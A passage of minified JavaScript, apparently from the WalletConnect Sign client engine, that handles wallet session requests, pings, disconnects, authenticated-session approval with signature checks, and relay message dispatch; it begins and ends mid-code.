this.setExpiry(r,Ee(_r)),this.sendRequest({topic:r,method:"wc_sessionExtend",params:{},clientRpcId:i,throwOnFailedPublish:!0}).catch(c=>{a(c)}),{acknowledged:s}}),F(this,"request",async n=>{this.isInitialized();try{await this.isValidRequest(n)}catch(w){throw this.client.logger.error("request() -> isValidRequest() failed"),w}const{chainId:r,request:i,topic:s,expiry:o=Be.wc_sessionRequest.req.ttl}=n,a=this.client.session.get(s);a?.transportType===he.relay&&await this.confirmOnlineStateOrThrow();const c=jt(),l=On().toString(),{done:u,resolve:h,reject:f}=Vn(o,"Request expired. Please try again.");this.events.once(oe("session_request",c),({error:w,result:_})=>{w?f(w):h(_)});const p="wc_sessionRequest",d=this.getAppLinkIfEnabled(a.peer.metadata,a.transportType);if(d)return await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:p,params:{request:Re(ie({},i),{expiryTimestamp:Ee(o)}),chainId:r},expiry:o,throwOnFailedPublish:!0,appLink:d}).catch(w=>f(w)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:r,id:c}),await u();const g={request:Re(ie({},i),{expiryTimestamp:Ee(o)}),chainId:r};return await Promise.all([new Promise(async w=>{await this.sendRequest({clientRpcId:c,relayRpcId:l,topic:s,method:p,params:g,expiry:o,throwOnFailedPublish:!0,tvf:this.getTVFParams(c,g)}).catch(_=>f(_)),this.client.events.emit("session_request_sent",{topic:s,request:i,chainId:r,id:c}),w()}),new Promise(async w=>{var _;if(!((_=a.sessionConfig)!=null&&_.disableDeepLink)){const C=await n3(this.client.core.storage,wf);await Qx({id:c,topic:s,wcDeepLink:C})}w()}),u()]).then(w=>w[2])}),F(this,"respond",async n=>{var r,i;this.isInitialized();const s=this.client.core.eventClient.createEvent({properties:{topic:n?.topic||((i=(r=n?.response)==null?void 0:r.id)==null?void 0:i.toString()),trace:[Dt.session_request_response_started]}});try{await this.isValidRespond(n)}catch(h){throw s.addTrace(h?.message),s.setError(Fn.session_request_response_validation_failure),h}s.addTrace(Dt.session_request_response_validation_success);const{topic:o,response:a}=n,{id:c}=a,l=this.client.session.get(o);l.transportType===he.relay&&await this.confirmOnlineStateOrThrow();const u=this.getAppLinkIfEnabled(l.peer.metadata,l.transportType);try{s.addTrace(Dt.session_request_response_publish_started),qt(a)?await this.sendResult({id:c,topic:o,result:a.result,throwOnFailedPublish:!0,appLink:u}):vt(a)&&await this.sendError({id:c,topic:o,error:a.error,appLink:u}),this.cleanupAfterResponse(n)}catch(h){throw s.addTrace(h?.message),s.setError(Fn.session_request_response_publish_failure),h}}),F(this,"ping",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow();try{await this.isValidPing(n)}catch(i){throw this.client.logger.error("ping() -> isValidPing() failed"),i}const{topic:r}=n;if(this.client.session.keys.includes(r)){const i=jt(),s=On().toString(),{done:o,resolve:a,reject:c}=Vn(z.FIVE_MINUTES,"Ping request expired without receiving any acknowledgement");this.events.once(oe("session_ping",i),({error:l})=>{l?c(l):a()}),await Promise.all([this.sendRequest({topic:r,method:"wc_sessionPing",params:{},throwOnFailedPublish:!0,clientRpcId:i,relayRpcId:s}),o()])}else this.client.core.pairing.pairings.keys.includes(r)&&(this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),await this.client.core.pairing.ping({topic:r}))}),F(this,"emit",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidEmit(n);const{topic:r,event:i,chainId:s}=n,o=On().toString(),a=jt();await this.sendRequest({topic:r,method:"wc_sessionEvent",params:{event:i,chainId:s},throwOnFailedPublish:!0,relayRpcId:o,clientRpcId:a})}),F(this,"disconnect",async n=>{this.isInitialized(),await this.confirmOnlineStateOrThrow(),await this.isValidDisconnect(n);const{topic:r}=n;if(this.client.session.keys.includes(r))await this.sendRequest({topic:r,method:"wc_sessionDelete",params:de("USER_DISCONNECTED"),throwOnFailedPublish:!0}),await this.deleteSession({topic:r,emitEvent:!1});else if(this.client.core.pairing.pairings.keys.includes(r))await this.client.core.pairing.disconnect({topic:r});else{const{message:i}=V("MISMATCHED_TOPIC",`Session or pairing topic not found: ${r}`);throw new Error(i)}}),F(this,"find",n=>(this.isInitialized(),this.client.session.getAll().filter(r=>E8(r,n)))),F(this,"getPendingSessionRequests",()=>this.client.pendingRequest.getAll()),F(this,"authenticate",async(n,r)=>{var i;this.isInitialized(),this.isValidAuthenticate(n);const s=r&&this.client.core.linkModeSupportedApps.includes(r)&&((i=this.client.metadata.redirect)==null?void 0:i.linkMode),o=s?he.link_mode:he.relay;o===he.relay&&await this.confirmOnlineStateOrThrow();const{chains:a,statement:c="",uri:l,domain:u,nonce:h,type:f,exp:p,nbf:d,methods:g=[],expiry:w}=n,_=[...n.resources||[]],{topic:C,uri:v}=await this.client.core.pairing.create({methods:["wc_sessionAuthenticate"],transportType:o});this.client.logger.info({message:"Generated new pairing",pairing:{topic:C,uri:v}});const b=await this.client.core.crypto.generateKeyPair(),x=ps(b);if(await Promise.all([this.client.auth.authKeys.set(ys,{responseTopic:x,publicKey:b}),this.client.auth.pairingTopics.set(x,{topic:x,pairingTopic:C})]),await this.client.core.relayer.subscribe(x,{transportType:o}),this.client.logger.info(`sending request to new pairing topic: ${C}`),g.length>0){const{namespace:A}=fs(a[0]);let R=v_(A,"request",g);ds(_)&&(R=x_(R,_.pop())),_.push(R)}const O=w&&w>Be.wc_sessionAuthenticate.req.ttl?w:Be.wc_sessionAuthenticate.req.ttl,B={authPayload:{type:f??"caip122",chains:a,statement:c,aud:l,domain:u,version:"1",nonce:h,iat:new Date().toISOString(),exp:p,nbf:d,resources:_},requester:{publicKey:b,metadata:this.client.metadata},expiryTimestamp:Ee(O)},k={eip155:{chains:a,methods:[...new Set(["personal_sign",...g])],events:["chainChanged","accountsChanged"]}},$={requiredNamespaces:{},optionalNamespaces:k,relays:[{protocol:"irn"}],pairingTopic:C,proposer:{publicKey:b,metadata:this.client.metadata},expiryTimestamp:Ee(Be.wc_sessionPropose.req.ttl),id:jt()},{done:N,resolve:E,reject:S}=Vn(O,"Request expired"),D=jt(),P=oe("session_connect",$.id),y=oe("session_request",D),m=async({error:A,session:R})=>{this.events.off(y,I),A?S(A):R&&E({session:R})},I=async A=>{var R,U,M;if(await this.deletePendingAuthRequest(D,{message:"fulfilled",code:0}),A.error){const H=de("WC_METHOD_UNSUPPORTED","wc_sessionAuthenticate");return A.error.code===H.code?void 0:(this.events.off(P,m),S(A.error.message))}await this.deleteProposal($.id),this.events.off(P,m);const{cacaos:q,responder:L}=A.result,j=[],K=[];for(const H of q){await oh({cacao:H,projectId:this.client.core.projectId})||(this.client.logger.error(H,"Signature verification failed"),S(de("SESSION_SETTLEMENT_FAILED","Signature verification failed")));const{p:Y}=H,te=ds(Y.resources),ue=[Fa(Y.iss)],pe=Bs(Y.iss);if(te){const ye=ah(te),at=ch(te);j.push(...ye),ue.push(...at)}for(const ye of ue)K.push(`${ye}:${pe}`)}const G=await this.client.core.crypto.generateSharedKey(b,L.publicKey);let Z;j.length>0&&(Z={topic:G,acknowledged:!0,self:{publicKey:b,metadata:this.client.metadata},peer:L,controller:L.publicKey,expiry:Ee(_r),requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:C,namespaces:Rh([...new Set(j)],[...new Set(K)]),transportType:o},await this.client.core.relayer.subscribe(G,{transportType:o}),await this.client.session.set(G,Z),C&&await this.client.core.pairing.updateMetadata({topic:C,metadata:L.metadata}),Z=this.client.session.get(G)),(R=this.client.metadata.redirect)!=null&&R.linkMode&&(U=L.metadata.redirect)!=null&&U.linkMode&&(M=L.metadata.redirect)!=null&&M.universal&&r&&(this.client.core.addLinkModeSupportedApp(L.metadata.redirect.universal),this.client.session.update(G,{transportType:he.link_mode})),E({auths:q,session:Z})};this.events.once(P,m),this.events.once(y,I);let T;try{if(s){const A=rn("wc_sessionAuthenticate",B,D);this.client.core.history.set(C,A);const R=await this.client.core.crypto.encode("",A,{type:Fi,encoding:An});T=ss(r,C,R)}else await Promise.all([this.sendRequest({topic:C,method:"wc_sessionAuthenticate",params:B,expiry:n.expiry,throwOnFailedPublish:!0,clientRpcId:D}),this.sendRequest({topic:C,method:"wc_sessionPropose",params:$,expiry:Be.wc_sessionPropose.req.ttl,throwOnFailedPublish:!0,clientRpcId:$.id})])}catch(A){throw this.events.off(P,m),this.events.off(y,I),A}return await this.setProposal($.id,$),await this.setAuthRequest(D,{request:Re(ie({},B),{verifyContext:{}}),pairingTopic:C,transportType:o}),{uri:T??v,response:N}}),F(this,"approveSessionAuthenticate",async n=>{const{id:r,auths:i}=n,s=this.client.core.eventClient.createEvent({properties:{topic:r.toString(),trace:[jn.authenticated_session_approve_started]}});try{this.isInitialized()}catch(w){throw s.setError(ri.no_internet_connection),w}const o=this.getPendingAuthRequest(r);if(!o)throw s.setError(ri.authenticated_session_pending_request_not_found),new Error(`Could not find pending auth request with id ${r}`);const a=o.transportType||he.relay;a===he.relay&&await this.confirmOnlineStateOrThrow();const c=o.requester.publicKey,l=await this.client.core.crypto.generateKeyPair(),u=ps(c),h={type:an,receiverPublicKey:c,senderPublicKey:l},f=[],p=[];for(const w of i){if(!await oh({cacao:w,projectId:this.client.core.projectId})){s.setError(ri.invalid_cacao);const x=de("SESSION_SETTLEMENT_FAILED","Signature verification failed");throw await this.sendError({id:r,topic:u,error:x,encodeOpts:h}),new Error(x.message)}s.addTrace(jn.cacaos_verified);const{p:_}=w,C=ds(_.resources),v=[Fa(_.iss)],b=Bs(_.iss);if(C){const x=ah(C),O=ch(C);f.push(...x),v.push(...O)}for(const x of v)p.push(`${x}:${b}`)}const d=await this.client.core.crypto.generateSharedKey(l,c);s.addTrace(jn.create_authenticated_session_topic);let g;if(f?.length>0){g={topic:d,acknowledged:!0,self:{publicKey:l,metadata:this.client.metadata},peer:{publicKey:c,metadata:o.requester.metadata},controller:c,expiry:Ee(_r),authentication:i,requiredNamespaces:{},optionalNamespaces:{},relay:{protocol:"irn"},pairingTopic:o.pairingTopic,namespaces:Rh([...new Set(f)],[...new Set(p)]),transportType:a},s.addTrace(jn.subscribing_authenticated_session_topic);try{await this.client.core.relayer.subscribe(d,{transportType:a})}catch(w){throw s.setError(ri.subscribe_authenticated_session_topic_failure),w}s.addTrace(jn.subscribe_authenticated_session_topic_success),await this.client.session.set(d,g),s.addTrace(jn.store_authenticated_session),await this.client.core.pairing.updateMetadata({topic:o.pairingTopic,metadata:o.requester.metadata})}s.addTrace(jn.publishing_authenticated_session_approve);try{await this.sendResult({topic:u,id:r,result:{cacaos:i,responder:{publicKey:l,metadata:this.client.metadata}},encodeOpts:h,throwOnFailedPublish:!0,appLink:this.getAppLinkIfEnabled(o.requester.metadata,a)})}catch(w){throw s.setError(ri.authenticated_session_approve_publish_failure),w}return await this.client.auth.requests.delete(r,{message:"fulfilled",code:0}),await this.client.core.pairing.activate({topic:o.pairingTopic}),this.client.core.eventClient.deleteEvent({eventId:s.eventId}),{session:g}}),F(this,"rejectSessionAuthenticate",async n=>{this.isInitialized();const{id:r,reason:i}=n,s=this.getPendingAuthRequest(r);if(!s)throw new Error(`Could not find pending auth request with id ${r}`);s.transportType===he.relay&&await this.confirmOnlineStateOrThrow();const o=s.requester.publicKey,a=await this.client.core.crypto.generateKeyPair(),c=ps(o),l={type:an,receiverPublicKey:o,senderPublicKey:a};await this.sendError({id:r,topic:c,error:i,encodeOpts:l,rpcOpts:Be.wc_sessionAuthenticate.reject,appLink:this.getAppLinkIfEnabled(s.requester.metadata,s.transportType)}),await this.client.auth.requests.delete(r,{message:"rejected",code:0}),await this.deleteProposal(r)}),F(this,"formatAuthMessage",n=>{this.isInitialized();const{request:r,iss:i}=n;return jp(r,i)}),F(this,"processRelayMessageCache",()=>{setTimeout(async()=>{if(this.relayMessageCache.length!==0)for(;this.relayMessageCache.length>0;)try{const n=this.relayMessageCache.shift();n&&await this.onRelayMessage(n)}catch(n){this.client.logger.error(n)}},50)}),F(this,"cleanupDuplicatePairings",async n=>{if(n.pairingTopic)try{const r=this.client.core.pairing.pairings.get(n.pairingTopic),i=this.client.core.pairing.pairings.getAll().filter(s=>{var o,a;return((o=s.peerMetadata)==null?void 0:o.url)&&((a=s.peerMetadata)==null?void 0:a.url)===n.peer.metadata.url&&s.topic&&s.topic!==r.topic});if(i.length===0)return;this.client.logger.info(`Cleaning up ${i.length} duplicate pairing(s)`),await Promise.all(i.map(s=>this.client.core.pairing.disconnect({topic:s.topic}))),this.client.logger.info("Duplicate pairings clean up finished")}catch(r){this.client.logger.error(r)}}),F(this,"deleteSession",async n=>{var r;const{topic:i,expirerHasDeleted:s=!1,emitEvent:o=!0,id:a=0}=n,{self:c}=this.client.session.get(i);await this.client.core.relayer.unsubscribe(i),await this.client.session.delete(i,de("USER_DISCONNECTED")),this.addToRecentlyDeleted(i,"session"),this.client.core.crypto.keychain.has(c.publicKey)&&await this.client.core.crypto.deleteKeyPair(c.publicKey),this.client.core.crypto.keychain.has(i)&&await this.client.core.crypto.deleteSymKey(i),s||this.client.core.expirer.del(i),this.client.core.storage.removeItem(wf).catch(l=>this.client.logger.warn(l)),i===((r=this.sessionRequestQueue.queue[0])==null?void 0:r.topic)&&(this.sessionRequestQueue.state=Ut.idle),await Promise.all(this.getPendingSessionRequests().filter(l=>l.topic===i).map(l=>this.deletePendingSessionRequest(l.id,de("USER_DISCONNECTED")))),o&&this.client.events.emit("session_delete",{id:a,topic:i})}),F(this,"deleteProposal",async(n,r)=>{if(r)try{const i=this.client.proposal.get(n);this.client.core.eventClient.getEvent({topic:i.pairingTopic})?.setError(Fn.proposal_expired)}catch{}await Promise.all([this.client.proposal.delete(n,de("USER_DISCONNECTED")),r?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"proposal")}),F(this,"deletePendingSessionRequest",async(n,r,i=!1)=>{await Promise.all([this.client.pendingRequest.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)]),this.addToRecentlyDeleted(n,"request"),this.sessionRequestQueue.queue=this.sessionRequestQueue.queue.filter(s=>s.id!==n),i&&(this.sessionRequestQueue.state=Ut.idle,this.client.events.emit("session_request_expire",{id:n}))}),F(this,"deletePendingAuthRequest",async(n,r,i=!1)=>{await Promise.all([this.client.auth.requests.delete(n,r),i?Promise.resolve():this.client.core.expirer.del(n)])}),F(this,"setExpiry",async(n,r)=>{this.client.session.keys.includes(n)&&(this.client.core.expirer.set(n,r),await this.client.session.update(n,{expiry:r}))}),F(this,"setProposal",async(n,r)=>{this.client.core.expirer.set(n,Ee(Be.wc_sessionPropose.req.ttl)),await this.client.proposal.set(n,r)}),F(this,"setAuthRequest",async(n,r)=>{const{request:i,pairingTopic:s,transportType:o=he.relay}=r;this.client.core.expirer.set(n,i.expiryTimestamp),await this.client.auth.requests.set(n,{authPayload:i.authPayload,requester:i.requester,expiryTimestamp:i.expiryTimestamp,id:n,pairingTopic:s,verifyContext:i.verifyContext,transportType:o})}),F(this,"setPendingSessionRequest",async n=>{const{id:r,topic:i,params:s,verifyContext:o}=n,a=s.request.expiryTimestamp||Ee(Be.wc_sessionRequest.req.ttl);this.client.core.expirer.set(r,a),await this.client.pendingRequest.set(r,{id:r,topic:i,params:s,verifyContext:o})}),F(this,"sendRequest",async n=>{const{topic:r,method:i,params:s,expiry:o,relayRpcId:a,clientRpcId:c,throwOnFailedPublish:l,appLink:u,tvf:h,publishOpts:f={}}=n,p=rn(i,s,c);let d;const g=!!u;try{const C=g?An:nt;d=await this.client.core.crypto.encode(r,p,{encoding:C})}catch(C){throw await this.cleanup(),this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${r} failed`),C}let w;if(LO.includes(i)){const C=bt(JSON.stringify(p)),v=bt(d);w=await this.client.core.verify.register({id:v,decryptedId:C})}const _=ie(ie({},Be[i].req),f);if(_.attestation=w,o&&(_.ttl=o),a&&(_.id=a),this.client.core.history.set(r,p),g){const C=ss(u,r,d);await global.Linking.openURL(C,this.client.name)}else _.tvf=Re(ie({},h),{correlationId:p.id}),l?(_.internal=Re(ie({},_.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(r,d,_)):this.client.core.relayer.publish(r,d,_).catch(C=>this.client.logger.error(C));return p.id}),F(this,"sendProposeSession",async n=>{const{proposal:r,publishOpts:i}=n,s=rn("wc_sessionPropose",r,r.id);this.client.core.history.set(r.pairingTopic,s);const o=await this.client.core.crypto.encode(r.pairingTopic,s,{encoding:nt}),a=bt(JSON.stringify(s)),c=bt(o),l=await this.client.core.verify.register({id:c,decryptedId:a});await this.client.core.relayer.publishCustom({payload:{pairingTopic:r.pairingTopic,sessionProposal:o},opts:Re(ie({},i),{publishMethod:"wc_proposeSession",attestation:l})})}),F(this,"sendApproveSession",async n=>{const{sessionTopic:r,pairingProposalResponse:i,proposal:s,sessionSettleRequest:o,publishOpts:a}=n,c=Ls(s.id,i),l=await this.client.core.crypto.encode(s.pairingTopic,c,{encoding:nt}),u=rn("wc_sessionSettle",o,a?.id),h=await this.client.core.crypto.encode(r,u,{encoding:nt});this.client.core.history.set(r,u),await this.client.core.relayer.publishCustom({payload:{sessionTopic:r,pairingTopic:s.pairingTopic,sessionProposalResponse:l,sessionSettlementRequest:h},opts:Re(ie({},a),{publishMethod:"wc_approveSession"})})}),F(this,"sendResult",async n=>{const{id:r,topic:i,result:s,throwOnFailedPublish:o,encodeOpts:a,appLink:c}=n,l=Ls(r,s);let u;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const d=h?An:nt;u=await this.client.core.crypto.encode(i,l,Re(ie({},a||{}),{encoding:d}))}catch(d){throw await this.cleanup(),this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${i} failed`),d}let f,p;try{f=await this.client.core.history.get(i,r);const d=f.request;try{p=this.getTVFParams(r,d.params,s)}catch(g){this.client.logger.warn(`sendResult() -> getTVFParams() failed: ${g?.message}`)}}catch(d){throw this.client.logger.error(`sendResult() -> history.get(${i}, ${r}) failed`),d}if(h){const d=ss(c,i,u);await global.Linking.openURL(d,this.client.name)}else{const d=f.request.method,g=Be[d].res;g.tvf=Re(ie({},p),{correlationId:r}),o?(g.internal=Re(ie({},g.internal),{throwOnFailedPublish:!0}),await this.client.core.relayer.publish(i,u,g)):this.client.core.relayer.publish(i,u,g).catch(w=>this.client.logger.error(w))}await this.client.core.history.resolve(l)}),F(this,"sendError",async n=>{const{id:r,topic:i,error:s,encodeOpts:o,rpcOpts:a,appLink:c}=n,l=Qc(r,s);let u;const h=c&&typeof(global==null?void 0:global.Linking)<"u";try{const p=h?An:nt;u=await this.client.core.crypto.encode(i,l,Re(ie({},o||{}),{encoding:p}))}catch(p){throw await this.cleanup(),this.client.logger.error(`sendError() -> core.crypto.encode() for topic ${i} failed`),p}let f;try{f=await this.client.core.history.get(i,r)}catch(p){throw this.client.logger.error(`sendError() -> history.get(${i}, ${r}) failed`),p}if(h){const p=ss(c,i,u);await global.Linking.openURL(p,this.client.name)}else{const p=f.request.method,d=a||Be[p].res;this.client.core.relayer.publish(i,u,d)}await this.client.core.history.resolve(l)}),F(this,"cleanup",async()=>{const n=[],r=[];this.client.session.getAll().forEach(i=>{let s=!1;vn(i.expiry)&&(s=!0),this.client.core.crypto.keychain.has(i.topic)||(s=!0),s&&n.push(i.topic)}),this.client.proposal.getAll().forEach(i=>{vn(i.expiryTimestamp)&&r.push(i.id)}),await Promise.all([...n.map(i=>this.deleteSession({topic:i})),...r.map(i=>this.deleteProposal(i))])}),F(this,"onProviderMessageEvent",async n=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(n):await this.onRelayMessage(n)}),F(this,"onRelayEventRequest",async n=>{this.requestQueue.queue.push(n),await this.processRequestsQueue()}),F(this,"processRequestsQueue",async()=>{if(this.requestQueue.state===Ut.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=Ut.active;const n=this.requestQueue.queue.shift();if(n)try{await this.processRequest(n)}catch(r){this.client.logger.warn(r)}}this.requestQueue.state=Ut.idle}),F(this,"processRequest",async n=>{const{topic:r,payload:i,attestation:s,transportType:o,encryptedId:a}=n,c=i.method;if(!this.shouldIgnorePairingRequest({topic:r,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:r,payload:i,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(r,i);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(r,i);case"wc_sessionExtend":return await this.onSessionExtendRequest(r,i);case"wc_sessionPing":return await this.onSessionPingRequest(r,i);case"wc_sessionDelete":return await this.onSessionDeleteRequest(r,i);case"wc_sessionRequest":return await this.onSessionRequest({topic:r,payload:i,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(r,i);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:r,payload:i,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}}),F(this,"onRelayEventResponse",async n=>{const{topic:r,payload:i,transportType:s}=n,o=(await this.client.core.history.get(r,i.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(r,i,s);case"wc_sessionSettle":return this.onSessionSettleResponse(r,i);case"wc_sessionUpdate":return this.onSessionUpdateResponse(r,i);case"wc_sessionExtend":return this.onSessionExtendResponse(r,i);case"wc_sessionPing":return this.onSessionPingResponse(r,i);case"wc_sessionRequest":return this.onSessionRequestResponse(r,i);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(r,i);default:return this.client.logger.info(`Unsupported response method ${o}`)}}),F(this,"onRelayEventUnknownPayload",n=>{const{topic:r}=n,{message:i}=V("MISSING_OR_INVALID",`Decoded payload on topic ${r} is not identifiable as a JSON-RPC request or a response.`);throw new Error(i)}),F(this,"shouldIgnorePairingRequest",n=>{const{topic:r,requestMethod:i}=n,s=this.expectedPairingMethodMap.get(r);return!s||s.includes(i)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)}),F(this,"onSessionProposeRequest",async n=>{const{topic:r,payload:i,attestation:s,encryptedId:o}=n,{params:a,id:c}=i;try{const l=this.client.core.eventClient.getEvent({topic:r});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l?.setError(Qt.proposal_listener_not_found)),this.isValidConnect(ie({},i.params));const u=a.expiryTimestamp||Ee(Be.wc_sessionPropose.req.ttl),h=ie({id:c,pairingTopic:r,expiryTimestamp:u,attestation:s,encryptedId:o},a);await this.setProposal(c,h);const f=await this.getVerifyContext({attestationId:s,hash:bt(JSON.stringify(i)),encryptedId:o,metadata:h.proposer.metadata});l?.addTrace(Ft.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:h,verifyContext:f})}catch(l){await this.sendError({id:c,topic:r,error:l,rpcOpts:Be.wc_sessionPropose.autoReject}),this.client.logger.error(l)}}),F(this,"onSessionProposeResponse",async(n,r,i)=>{const{id:s}=r;if(qt(r)){const{result:o}=r;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const u=await this.client.core.crypto.generateSharedKey(c,l);this.pendingSessions.set(s,{sessionTopic:u,pairingTopic:n,proposalId:s,publicKey:c});const h=await this.client.core.relayer.subscribe(u,{transportType:i});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:h}),await this.client.core.pairing.activate({topic:n})}else if(vt(r)){await this.deleteProposal(s);const o=oe("session_connect",s);if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(o,{error:r.error})}}),F(this,"onSessionSettleRequest",async(n,r)=>{const{id:i,params:s}=r;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:u,scopedProperties:h,sessionConfig:f,proposalRequestsResponses:p}=r.params,d=[...this.pendingSessions.values()].find(_=>_.sessionTopic===n);if(!d)return this.client.logger.error(`Pending session not found for topic ${n}`);const g=this.client.proposal.get(d.proposalId),w=Re(ie(ie(ie({topic:n,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:d.pairingTopic,requiredNamespaces:g.requiredNamespaces,optionalNamespaces:g.optionalNamespaces,controller:a.publicKey,self:{publicKey:d.publicKey,metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},u&&{sessionProperties:u}),h&&{scopedProperties:h}),f&&{sessionConfig:f}),{transportType:he.relay,authentication:p?.authentication,walletPayResult:p?.walletPay});await this.client.session.set(w.topic,w),await this.setExpiry(w.topic,w.expiry),await this.client.core.pairing.updateMetadata({topic:d.pairingTopic,metadata:w.peer.metadata}),this.pendingSessions.delete(d.proposalId),this.deleteProposal(d.proposalId,!1),this.cleanupDuplicatePairings(w),await this.sendResult({id:r.id,topic:n,throwOnFailedPublish:!0,result:!0}),this.client.events.emit("session_connect",{session:w}),this.events.emit(oe("session_connect",d.proposalId),{session:w})}catch(o){await this.sendError({id:i,topic:n,error:o}),this.client.logger.error(o)}}),F(this,"onSessionSettleResponse",async(n,r)=>{const{id:i}=r;qt(r)?(await this.client.session.update(n,{acknowledged:!0}),this.events.emit(oe("session_approve",i),{})):vt(r)&&(await this.client.session.delete(n,de("USER_DISCONNECTED")),this.events.emit(oe("session_approve",i),{error:r.error}))}),F(this,"onSessionUpdateRequest",async(n,r)=>{const{params:i,id:s}=r;try{const o=`${n}_session_update`,a=ti.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:n,error:de("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(ie({topic:n},i));try{ti.set(o,s),await this.client.session.update(n,{namespaces:i.namespaces}),await this.sendResult({id:s,topic:n,result:!0})}catch(c){throw ti.delete(o),c}this.client.events.emit("session_update",{id:s,topic:n,params:i})}catch(o){await this.sendError({id:s,topic:n,error:o}),this.client.logger.error(o)}}),F(this,"isRequestOutOfSync",(n,r)=>r.toString().slice(0,-3)<n.toString().slice(0,-3)),F(this,"onSessionUpdateResponse",(n,r)=>{const{id:i}=r,s=oe("session_update",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);qt(r)?this.events.emit(oe("session_update",i),{}):vt(r)&&this.events.emit(oe("session_update",i),{error:r.error})}),F(this,"onSessionExtendRequest",async(n,r)=>{const{id:i}=r;try{this.isValidExtend({topic:n}),await this.setExpiry(n,Ee(_r)),await this.sendResult({id:i,topic:n,result:!0}),this.client.events.emit("session_extend",{id:i,topic:n})}catch(s){await this.sendError({id:i,topic:n,error:s}),this.client.logger.error(s)}}),F(this,"onSessionExtendResponse",(n,r)=>{const{id:i}=r,s=oe("session_extend",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);qt(r)?this.events.emit(oe("session_extend",i),{}):vt(r)&&this.events.emit(oe("session_extend",i),{error:r.error})}),F(this,"onSessionPingRequest",async(n,r)=>{const{id:i}=r;try{this.isValidPing({topic:n}),await this.sendResult({id:i,topic:n,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:i,topic:n})}catch(s){await this.sendError({id:i,topic:n,error:s}),this.client.logger.error(s)}}),F(this,"onSessionPingResponse",(n,r)=>{const{id:i}=r,s=oe("session_ping",i);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);qt(r)?this.events.emit(oe("session_ping",i),{}):vt(r)&&this.events.emit(oe("session_ping",i),{error:r.error})},500)}),F(this,"onSessionDeleteRequest",async(n,r)=>{const{id:i}=r;try{await this.isValidDisconnect({topic:n,reason:r.params}),this.cleanupPendingSentRequestsForTopic({topic:n,error:de("USER_DISCONNECTED")}),await this.deleteSession({topic:n,id:i})}catch(s){this.client.logger.error(s)}}),F(this,"onSessionRequest",async n=>{var r,i,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:u}=n,{id:h,params:f}=a;try{await this.isValidRequest(ie({topic:o},f));const p=this.client.session.get(o),d=await this.getVerifyContext({attestationId:c,hash:bt(JSON.stringify(rn("wc_sessionRequest",f,h))),encryptedId:l,metadata:p.peer.metadata,transportType:u}),g={id:h,topic:o,params:f,verifyContext:d};await this.setPendingSessionRequest(g),u===he.link_mode&&(r=p.peer.metadata.redirect)!=null&&r.universal&&this.client.core.addLinkModeSupportedApp((i=p.peer.metadata.redirect)==null?void 0:i.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(g):(this.addSessionRequestToSessionRequestQueue(g),this.processSessionRequestQueue())}catch(p){await this.sendError({id:h,topic:o,error:p}),this.client.logger.error(p)}}),F(this,"onSessionRequestResponse",(n,r)=>{const{id:i}=r,s=oe("session_request",i);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);qt(r)?this.events.emit(oe("session_request",i),{result:r.result}):vt(r)&&this.events.emit(oe("session_request",i),{error:r.error})}),F(this,"onSessionEventRequest",async(n,r)=>{const{id:i,params:s}=r;try{const o=`${n}_session_event_${s.event.name}`,a=ti.get(o);if(a&&this.isRequestOutOfSync(a,i)){this.client.logger.info(`Discarding out of sync request - ${i}`);return}this.isValidEmit(ie({topic:n},s)),this.client.events.emit("session_event",{id:i,topic:n,params:s}),ti.set(o,i)}catch(o){await 